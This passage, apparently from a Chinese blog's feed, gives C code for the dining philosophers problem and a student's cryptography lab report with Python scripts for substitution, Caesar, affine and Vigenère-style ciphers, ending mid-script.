id="五、哲学家就餐算法"><a href="#五、哲学家就餐算法" class="headerlink" title="五、哲学家就餐算法"></a>五、哲学家就餐算法</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;math.h&gt;&#x2F;&#x2F;筷子作为mutexpthread_mutex_t chopstick[6] ;void *eat_think(void *arg)&#123;    char phi &#x3D; *(char *)arg;    int left,right; &#x2F;&#x2F;左右筷子的编号    switch (phi)    &#123;    case &#39;A&#39;:        left &#x3D; 5;        right &#x3D; 1;        break;    case &#39;B&#39;:        left &#x3D; 1;        right &#x3D; 2;        break;    case &#39;C&#39;:        left &#x3D; 2;        right &#x3D; 3;        break;    case &#39;D&#39;:        left &#x3D; 3;        right &#x3D; 4;        break;    case &#39;E&#39;:        left &#x3D; 4;        right &#x3D; 5;        break;    &#125;    int i;    for(;;)    &#123;        usleep(3); &#x2F;&#x2F;思考        pthread_mutex_lock(&amp;chopstick[left]); &#x2F;&#x2F;拿起左手的筷子        printf(&quot;Philosopher %c fetches chopstick %d\n&quot;, phi, left);        if (pthread_mutex_trylock(&amp;chopstick[right]) &#x3D;&#x3D; EBUSY)  &#x2F;&#x2F;拿起右手的筷子        &#123;            pthread_mutex_unlock(&amp;chopstick[left]); &#x2F;&#x2F;如果右边筷子被拿走放下左手的筷子            continue;        &#125;        &#x2F;&#x2F;pthread_mutex_lock(&amp;chopstick[right]); &#x2F;&#x2F;拿起右手的筷子，如果想观察死锁，把上一句if注释掉，再把这一句的注释去掉        printf(&quot;Philosopher %c fetches chopstick %d\n&quot;, phi, right);        printf(&quot;Philosopher %c is eating.\n&quot;,phi);        usleep(3); &#x2F;&#x2F;吃饭        pthread_mutex_unlock(&amp;chopstick[left]); &#x2F;&#x2F;放下左手的筷子        printf(&quot;Philosopher %c release chopstick %d\n&quot;, phi, left);        pthread_mutex_unlock(&amp;chopstick[right]); &#x2F;&#x2F;放下左手的筷子        printf(&quot;Philosopher %c release chopstick %d\n&quot;, phi, right);    &#125;&#125;int main()&#123;    pthread_t A,B,C,D,E; &#x2F;&#x2F;5个哲学家    int i;    for (i &#x3D; 0; i &lt; 5; i++)        pthread_mutex_init(&amp;chopstick[i],NULL);    pthread_create(&amp;A,NULL, eat_think, &quot;A&quot;);    pthread_create(&amp;B,NULL, eat_think, &quot;B&quot;);    pthread_create(&amp;C,NULL, eat_think, &quot;C&quot;);    pthread_create(&amp;D,NULL, eat_think, &quot;D&quot;);    pthread_create(&amp;E,NULL, eat_think, &quot;E&quot;);    pthread_join(A,NULL);    pthread_join(B,NULL);    pthread_join(C,NULL);    pthread_join(D,NULL);    pthread_join(E,NULL);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学实验报告</title>
      <link href="/2022/03/22/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
      <url>/2022/03/22/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="实验1-单表替代算法"><a href="#实验1-单表替代算法" class="headerlink" title="实验1  单表替代算法"></a>实验1  单表替代算法</h2><p>1、 实验目的</p><ol><li>了解替换密码的基本设计原理；</li><li>掌握基本的加密解密操作；</li></ol><p>2、实验时间：2学时</p><p>3、实验内容：任选语言，实现课本例2-1，2-2。</p><p>4、实验过程及结果：</p><p>（1）例2-1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">AlphaBet <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"I"</span><span class="token punctuation">,</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"R"</span><span class="token punctuation">,</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"V"</span><span class="token punctuation">,</span>  <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"Z"</span><span class="token punctuation">]</span>alphaBet <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"v"</span><span class="token punctuation">,</span>  <span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"z"</span><span class="token punctuation">]</span>MiYao <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"o"</span><span class="token punctuation">,</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"k"</span><span class="token punctuation">,</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span>  <span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"n "</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">]</span>mingwen <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文："</span><span class="token punctuation">)</span>miwen <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> mingwen<span class="token punctuation">:</span>  <span class="token keyword">if</span> i<span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    miwen <span class="token operator">=</span> miwen <span class="token operator">+</span> <span class="token string">' '</span>    <span class="token keyword">continue</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"Z"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      miwen <span class="token operator">=</span> miwen<span class="token operator">+</span>alphaBet<span class="token punctuation">[</span>MiYao<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">elif</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      miwen <span class="token operator">=</span> miwen<span class="token operator">+</span>MiYao<span class="token punctuation">[</span>alphaBet<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>miwen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）例2-2</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">kaisa</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#定义函数 接受一个字符串s 和 一个偏移量k</span>  lower <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token comment">#小写字母</span>  upper <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_uppercase <span class="token comment">#大写字母</span>  before <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token comment">#无偏移的字母顺序 小写+大写</span>  after <span class="token operator">=</span> lower<span class="token punctuation">[</span>k<span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> lower<span class="token punctuation">[</span><span class="token punctuation">:</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> upper<span class="token punctuation">[</span>k<span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> upper<span class="token punctuation">[</span><span class="token punctuation">:</span>k<span class="token punctuation">]</span><span class="token comment">#偏移后的字母顺序 还是小写+大写</span>  table <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>before<span class="token punctuation">,</span> after<span class="token punctuation">)</span>  <span class="token comment">#创建映射表</span>  <span class="token keyword">return</span> s<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>table<span class="token punctuation">)</span> <span class="token comment">#对s进行偏移 即加密</span>s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>kaisa<span class="token punctuation">(</span>s<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、心得体会：</p><p>怎么说呢，我的同学们都在用C，就我在拿python写这东西，这一部分我以前用python完成过，2-1是经典单表替代密码，2-2是经典的凯撒密码，这都是很经典的密码术，前人的智慧，在这次写脚本解决的时候，都可以用暴力解决。</p><p>2-1我本身是有一个输入秘钥进行替换的脚本，按照题目改成了以古典秘钥进行替换的脚本，凯撒加密的话，如果秘钥空间比较大的话，是不好用表替代的，最好还是用加减计算。但是这个题目只设计大小写字母，利用python代码的String库和字典切片可以简单创建大的字典。再通过映射阶。为了图省事，直接设置函数，在外面遍历直接进行爆破完成就行。</p><p>密码术的各种很奇妙，但是怎么说呢，在现代密码上基本不设防。</p><h2 id="实验2-多表替代算法"><a href="#实验2-多表替代算法" class="headerlink" title="实验2 多表替代算法"></a>实验2 多表替代算法</h2><p>1、 实验目的</p><ol><li>了解替换密码的基本设计原理；</li><li>掌握基本的加密解密操作；</li></ol><p>2、实验时间：2学时</p><p>3、实验内容：任选语言，实现课本例2-3,2-4。</p><p>4、实验过程及结果：</p><p>（1）例2-3仿射密码：</p><p>加密算法:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mingwen <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文："</span><span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入k0: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>b<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入k1: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>miwen <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> mingwen<span class="token punctuation">:</span>  <span class="token keyword">if</span> i<span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    miwen <span class="token operator">=</span> miwen <span class="token operator">+</span> <span class="token string">' '</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    miwen <span class="token operator">=</span>miwen<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">*</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>miwen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解密算法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mingwen <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    k <span class="token operator">=</span> a <span class="token operator">//</span> b    remainder <span class="token operator">=</span> a <span class="token operator">%</span> b    x1<span class="token punctuation">,</span> y1 <span class="token operator">=</span> get<span class="token punctuation">(</span>b<span class="token punctuation">,</span> remainder<span class="token punctuation">)</span>    x<span class="token punctuation">,</span> y <span class="token operator">=</span> y1<span class="token punctuation">,</span> x1 <span class="token operator">-</span> k <span class="token operator">*</span> y1  <span class="token keyword">return</span> x<span class="token punctuation">,</span> ymiwen <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入解密字符："</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入a："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入b："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 求a关于26的乘法逆元</span>x<span class="token punctuation">,</span> y <span class="token operator">=</span> get<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span>a1 <span class="token operator">=</span> x <span class="token operator">%</span> <span class="token number">26</span><span class="token keyword">for</span> i <span class="token keyword">in</span> miwen<span class="token punctuation">:</span>  <span class="token keyword">if</span> i<span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    mingwen <span class="token operator">=</span> mingwen <span class="token operator">+</span> <span class="token string">' '</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    mingwen<span class="token operator">=</span>mingwen<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>a1 <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span> <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）例2-4：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add_list</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>  result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    z <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">c2n</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  list_c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  list_n <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    list_n<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    list_c<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  dic_c2n <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span>list_c<span class="token punctuation">,</span>list_n<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> dic_c2n<span class="token comment"># 构造映射 num---->字符</span><span class="token keyword">def</span> <span class="token function">n2c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  list_c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  list_n <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    list_n<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    list_c<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  dic_n2c <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span>list_n<span class="token punctuation">,</span>list_c<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> dic_n2c<span class="token comment"># 实现列表元素对应相减（解密部分）</span><span class="token keyword">def</span> <span class="token function">sub_list</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>  result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    z <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>z<span class="token punctuation">)</span>  <span class="token keyword">return</span> result<span class="token comment"># 加密</span><span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'加密后的字符： '</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>  dic_c2n <span class="token operator">=</span> c2n<span class="token punctuation">(</span><span class="token punctuation">)</span>  dic_n2c <span class="token operator">=</span> n2c<span class="token punctuation">(</span><span class="token punctuation">)</span>  list_s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  list_key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  list_finall <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    i <span class="token operator">=</span> i<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    list_s<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic_c2n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>    i <span class="token operator">=</span> i<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    list_key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic_c2n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> list_key<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>list_key<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>list_s<span class="token punctuation">)</span><span class="token punctuation">:</span>      list_key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>  list_result <span class="token operator">=</span> add_list<span class="token punctuation">(</span>list_s<span class="token punctuation">,</span>list_key<span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> list_result<span class="token punctuation">:</span>   <span class="token keyword">if</span> i <span class="token operator">></span> <span class="token number">25</span><span class="token punctuation">:</span>      i <span class="token operator">-=</span> <span class="token number">26</span>    list_finall<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic_n2c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> list_finall<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># 解密</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'解密后的字符： '</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>  dic_c2n <span class="token operator">=</span> c2n<span class="token punctuation">(</span><span class="token punctuation">)</span>  dic_n2c <span class="token operator">=</span> n2c<span class="token punctuation">(</span><span class="token punctuation">)</span>  list_s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  list_key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  list_finall <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    i <span class="token operator">=</span> i<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    list_s<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic_c2n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>    i <span class="token operator">=</span> i<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    list_key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic_c2n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> list_key<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>list_key<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>list_s<span class="token punctuation">)</span><span class="token punctuation">:</span>      list_key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>  list_result <span class="token operator">=</span> sub_list<span class="token punctuation">(</span>list_s<span class="token punctuation">,</span>list_key<span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> list_result<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>      i <span class="token operator">+=</span> <span class="token number">26</span>    list_finall<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic_n2c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> list_finall<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># 函数入口</span>answer <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'请输入所需的操作：编码/E or 解码/D:  '</span></span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> answer<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'E'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入Key:'</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入需要加密的字符：'</span><span class="token punctuation">)</span>    encode<span class="token punctuation">(</span>s<span class="token punctuation">,</span>key<span class="token punctuation">)</span>  <span class="token keyword">elif</span> answer<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'D'</span><span class="token punctuation">:</span>    